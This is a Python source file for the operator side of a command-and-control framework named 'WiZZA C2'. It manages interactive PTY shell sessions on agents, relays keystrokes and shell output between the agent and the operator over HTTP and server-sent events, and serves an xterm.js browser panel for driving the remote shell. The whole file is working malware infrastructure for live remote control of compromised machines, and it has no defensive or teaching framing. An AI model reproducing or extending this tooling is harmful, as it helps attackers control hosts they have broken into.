"""
Interactive PTY shell handler for WiZZA C2.
Provides a real terminal (not just one-shot exec) through the agent.
Agent spawns a PTY shell, streams output via SSE, accepts input via POST.

Architecture:
  Browser xterm.js ← SSE /pty/stream?id=AID ← C2 ← HTTP POST ← agent output
  Browser xterm.js → POST /pty/input?id=AID  → C2 → HTTP poll  → agent stdin
"""
import threading, queue, time, os, base64
from collections import defaultdict

# ── Per-agent PTY sessions ───────────────────────────────────────────────────
# pty_sessions[aid] = {
#   "output": queue.Queue(),   # bytes from agent shell → browser
#   "input":  queue.Queue(),   # bytes from browser → agent shell
#   "active": bool,
#   "started": float (timestamp)
# }
pty_sessions: dict = {}
_lock = threading.Lock()

def start_pty(aid, shell=None):
    """Create a PTY session for agent. Returns status string."""
    with _lock:
        if aid in pty_sessions and pty_sessions[aid]["active"]:
            return f"PTY session already active for {aid}"
        pty_sessions[aid] = {
            "output": queue.Queue(maxsize=1000),
            "input":  queue.Queue(maxsize=500),
            "active": True,
            "started": time.time(),
            "shell": shell or "/bin/bash",
        }
    return f"PTY session started for {aid}"

def stop_pty(aid):
    with _lock:
        sess = pty_sessions.get(aid)
        if sess: sess["active"] = False

def pty_active(aid):
    sess = pty_sessions.get(aid)
    return sess is not None and sess["active"]

def put_output(aid, data: bytes):
    """Agent sends PTY output → queued for browser SSE."""
    sess = pty_sessions.get(aid)
    if sess and sess["active"]:
        try: sess["output"].put_nowait(data)
        except queue.Full: pass  # drop if browser too slow

def get_input(aid) -> bytes:
    """Agent polls for keystrokes from browser."""
    sess = pty_sessions.get(aid)
    if not sess: return b""
    chunks = []
    try:
        while True: chunks.append(sess["input"].get_nowait())
    except queue.Empty: pass
    return b"".join(chunks)

def put_input(aid, data):
    """Browser sends keystroke → queued for agent (str or bytes)."""
    if isinstance(data, str): data = data.encode()
    sess = pty_sessions.get(aid)
    if sess and sess["active"]:
        try: sess["input"].put_nowait(data)
        except queue.Full: pass

def stream_output(aid):
    """
    Generator that yields SSE-formatted strings from the agent's PTY output.
    Each yield: 'data: <base64>\n\n'
    Yields keepalive comments every ~15s to keep connection alive.
    """
    sess = pty_sessions.get(aid)
    if not sess:
        yield ": no session\n\n"
        return
    last_ka = time.time()
    while sess["active"]:
        try:
            data = sess["output"].get(timeout=0.5)
            if isinstance(data, str): data = data.encode()
            b64 = base64.b64encode(data).decode()
            yield f"data: {b64}\n\n"
            last_ka = time.time()
        except queue.Empty:
            if time.time() - last_ka > 15:
                yield ": keepalive\n\n"
                last_ka = time.time()
        except GeneratorExit:
            break
        except:
            break

# ── xterm.js panel HTML ──────────────────────────────────────────────────────
def pty_html(aid):
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Shell — {aid}</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css"/>
<style>
  body{{margin:0;padding:0;background:#1a1a1a;display:flex;flex-direction:column;height:100vh}}
  #toolbar{{background:#222;padding:6px 12px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #333}}
  #toolbar span{{color:#aaa;font-family:monospace;font-size:12px}}
  .badge{{background:#1a6e3a;color:#7dff9c;padding:2px 8px;border-radius:4px;font-size:11px}}
  .btn{{background:#333;color:#ccc;border:1px solid #444;padding:4px 10px;border-radius:4px;
        cursor:pointer;font-size:12px;font-family:monospace}}
  .btn:hover{{background:#444}}
  .btn.danger{{color:#f66}}
  #terminal{{flex:1;padding:4px}}
</style>
</head>
<body>
<div id="toolbar">
  <span class="badge">SHELL</span>
  <span>agent: <b style="color:#fff">{aid}</b></span>
  <button class="btn" onclick="term.clear()">Clear</button>
  <button class="btn" onclick="sendCtrlC()">Ctrl+C</button>
  <button class="btn" onclick="sendCtrlZ()">Ctrl+Z</button>
  <button class="btn danger" onclick="killShell()">Kill PTY</button>
  <span style="margin-left:auto;color:#555" id="status">connecting...</span>
</div>
<div id="terminal"></div>

<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
<script>
const AID = "{aid}";
const term = new Terminal({{
  theme: {{background:"#1a1a1a",foreground:"#f0f0f0",cursor:"#00ff00"}},
  fontFamily: "'Cascadia Code','Fira Code',monospace",
  fontSize: 13,
  cursorBlink: true,
  scrollback: 5000
}});
const fit = new FitAddon.FitAddon();
term.loadAddon(fit);
term.open(document.getElementById("terminal"));
fit.fit();
window.addEventListener("resize", ()=>fit.fit());

// ── Send keystrokes to agent ──────────────────────────────────
term.onData(data => {{
  fetch("/pty/"+AID+"/input", {{
    method:"POST",
    headers:{{"Content-Type":"application/octet-stream"}},
    body: new TextEncoder().encode(data)
  }});
}});

function sendCtrlC(){{
  fetch("/pty/"+AID+"/input", {{method:"POST", body:new Uint8Array([3])}});
}}
function sendCtrlZ(){{
  fetch("/pty/"+AID+"/input", {{method:"POST", body:new Uint8Array([26])}});
}}
function killShell(){{
  if(confirm("Kill PTY session?"))
    fetch("/pty/"+AID+"/stop",{{method:"POST"}}).then(()=>window.close());
}}

// ── Stream output from agent via SSE ─────────────────────────
const evtSrc = new EventSource("/pty/"+AID+"/stream");
evtSrc.onopen = ()=>document.getElementById("status").textContent="connected";
evtSrc.onerror = ()=>document.getElementById("status").textContent="disconnected";
evtSrc.onmessage = (e)=>{{
  try{{
    const bytes = Uint8Array.from(atob(e.data), c=>c.charCodeAt(0));
    term.write(bytes);
  }}catch(ex){{
    term.write(e.data);
  }}
}};

term.write("\\r\\n\\x1b[32m[WiZZA PTY]\\x1b[0m Waiting for shell...\\r\\n");
</script>
</body>
</html>"""
